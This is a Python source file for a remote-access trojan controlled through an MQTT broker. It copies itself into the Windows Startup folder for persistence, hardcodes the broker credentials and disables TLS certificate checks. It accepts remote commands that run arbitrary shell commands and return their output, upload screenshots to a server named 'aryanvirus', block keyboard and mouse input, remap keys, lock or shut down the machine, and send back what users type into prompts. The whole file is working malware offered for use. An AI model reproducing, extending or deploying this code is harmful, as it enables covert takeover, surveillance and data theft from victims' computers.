import paho.mqtt.client as mqtt
import threading
import socket
import uuid
import time
import pyautogui as pg
import keyboard
import os
import subprocess
import webbrowser
import requests
import shutil
from pathlib import Path
import sys
import ssl
import traceback

# Function imports
import blockInput
from notepadType import notepad_write
from prompt import alertPrompt, inputPrompt

# Startup setup
FLAG_FILE = Path(os.getenv('APPDATA')) / "my_program_first_run.flag"

def add_to_startup():
    try:
        startup_dir = Path(os.getenv('APPDATA')) / r"Microsoft\Windows\Start Menu\Programs\Startup"
        exe_path = Path(sys.argv[0]).resolve()
        destination = startup_dir / exe_path.name
        if not destination.exists():
            shutil.copy(exe_path, destination)
    except Exception as e:
        print(f"Failed to add to startup: {e}")

if not FLAG_FILE.exists():
    add_to_startup()
    FLAG_FILE.touch()

# Server / MQTT settings
# serverUrl = "http://localhost:3000"s
serverUrl = "https://aryanvirus.onrender.com"
BROKER = "n171f1d9.ala.eu-central-1.emqxsl.com"
PORT = 8883
USERNAME = "aryanvish2006"
PASSWORD = "aryanvish2006saniya"

POLL_INTERVAL = 60

# PC identification
pc_name = socket.gethostname()
mac = hex(uuid.getnode())
pc_id = f"{pc_name}_{mac}"

# MQTT topics
CONTROL_TOPIC = f"control/{pc_id}"
ACK_TOPIC = f"ack/{pc_id}"

# Poll server
# def should_connect():
#     try:
#         r = requests.get(f"{serverUrl}/shouldconnect", timeout=5)
#         return bool(r.json().get("connect"))
#     except:
#         return False

# Screenshot
def take_screenshot():
    try:
        filename = f"{pc_name}_screenshot.png"
        pg.screenshot(filename)
        with open(filename, "rb") as f:
            requests.post(f"{serverUrl}/upload", files={"screenshot": f}, timeout=5)
        os.remove(filename)
    except Exception as e:
        print(f"[screenshot error] {e}")


def safe_thread(target, *args, **kwargs):
    def wrapper():
        try:
            target(*args, **kwargs)
        except Exception as e:
            print(f"[ERROR] {target.__name__}: {e}")
            traceback.print_exc()
    t = threading.Thread(target=wrapper, daemon=True)
    t.start()

# Handle all messages
def handle_msg(msg):
    try:
        msg = msg.strip().lower()

        if msg == "block":
            safe_thread(blockInput.start_block, "both")
        elif msg == "blockkeyboard":
            safe_thread(blockInput.start_block, "keyboard")
        elif msg == "blockmouse":
            safe_thread(blockInput.start_block, "mouse")
        elif msg == "unblock":
            safe_thread(blockInput.unblock_all)
        elif msg == "shutdown":
            safe_thread(os.system, "shutdown /s /t 0")
        elif msg == "desktop":
            safe_thread(pg.hotkey, "win", "d")
        elif msg == "close":
            safe_thread(keyboard.send, "alt+f4")
        elif msg == "screenshot":
            safe_thread(take_screenshot)
        elif msg == "lock":
            safe_thread(os.system, "rundll32.exe user32.dll,LockWorkStation")
        elif msg == "cut":
            safe_thread(pg.press, "backspace")
        elif msg == "end":
            os._exit(0)

        elif msg.startswith("subprocess"):
            cmd = msg[len("subprocess "):]
            safe_thread(subprocess.run, cmd, shell=True)

        elif msg.startswith("browser"):
            url = msg[len("browser "):]
            safe_thread(webbrowser.open, url)

        elif msg.startswith("type"):
            text = msg[len("type "):]
            safe_thread(pg.typewrite, text, 0.2)

        elif msg.startswith("notepadtypeheart"):
            text = msg[len("notepadtypeheart "):]
            safe_thread(notepad_write, text, True)

        elif msg.startswith("notepadtype"):
            text = msg[len("notepadtype "):]
            safe_thread(notepad_write, text, False)

        elif msg.startswith("press"):
            key = msg[len("press "):]
            safe_thread(pg.press, key)

        elif msg.startswith("alertprompt"):
            text = msg[len("alertprompt "):]
            safe_thread(alertPrompt, text)

        elif msg.startswith("inputprompt"):
            text = msg[len("inputprompt "):]
            def handle_input():
                value = inputPrompt(text)
                client.publish(ACK_TOPIC, value)
            safe_thread(handle_input)

        elif msg.startswith("backspace"):
            count = int(msg[len("backspace "):])
            def backspacer():
                for _ in range(count):
                    pg.press("backspace")
                    time.sleep(0.05)
            safe_thread(backspacer)

        elif msg.startswith("blockkey"):
            key = msg[len("blockkey "):]
            safe_thread(keyboard.block_key, key)

        elif msg.startswith("unblockkey"):
            key = msg[len("unblockkey "):]
            safe_thread(keyboard.unblock_key, key)

        elif msg.startswith("remap"):
            parts = msg[len("remap "):].split()
            if len(parts) == 2:
                safe_thread(keyboard.remap_key, parts[0], parts[1])

        elif msg.startswith("swapkey"):
            parts = msg[len("swapkey "):].split()
            if len(parts) == 2:
                def swap():
                    keyboard.remap_key(parts[0], parts[1])
                    keyboard.remap_key(parts[1], parts[0])
                safe_thread(swap)

        elif msg.startswith("cmdwithoutput"):
            cmd = msg[len("cmdwithoutput "):]
            def cmd_exec():
                try:
                    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
                    client.publish(ACK_TOPIC, result.stdout)
                except Exception as e:
                    client.publish(ACK_TOPIC, f"Error: {e}")
            safe_thread(cmd_exec)

    except Exception as e:
        print(f"[FATAL ERROR in handle_msg]: {e}")
        traceback.print_exc()


# Send initial trace
TRACE_TOPIC = f"trace/{pc_id}"
def send_data():
    try:
        requests.get(f"{serverUrl}/posttrace", params={"pc_id": pc_id})
        client.publish(TRACE_TOPIC, f"TRACE:{pc_id}")
        print("sent")
    except:
        pass

def send_handler():
    threading.Thread(target=send_data).start()

keyboard.add_hotkey("ctrl+shift+q", send_handler)

# MQTT callbacks
def on_connect(client, userdata, flags, rc):
    print(f"{pc_id} Connected to MQTT broker, code: {rc}")
    client.subscribe(CONTROL_TOPIC)
    client.publish(ACK_TOPIC, f"{pc_id} Connected")

def on_message(client, userdata, msg):
    message = msg.payload.decode()
    print(f"Received: {message}")
    handle_msg(message)
    client.publish(ACK_TOPIC, f"ACK:{pc_id}")

# MQTT client setup
client = mqtt.Client()
client.username_pw_set(USERNAME, PASSWORD)
client.tls_set(cert_reqs=ssl.CERT_NONE)
client.tls_insecure_set(True)
client.on_connect = on_connect
client.on_message = on_message

HEARTBEAT_INTERVAL = 20
HEARTBEAT_TOPIC = f"heartbeat/{pc_id}"
def heartbeat_loop():
    while True:
        try:
            if client.is_connected():
                client.publish(HEARTBEAT_TOPIC,"1")
        except Exception as e:
            print(e)
        time.sleep(HEARTBEAT_INTERVAL)  
threading.Thread(target=heartbeat_loop,daemon=True).start()   


def connect_mqtt():
    while True:
        try:
            client.connect(BROKER, PORT, 60)
            break
        except Exception as e:
            print(f"MQTT connection failed: {e}, retrying in 5s...")
            time.sleep(5)

connect_mqtt()
client.loop_forever()



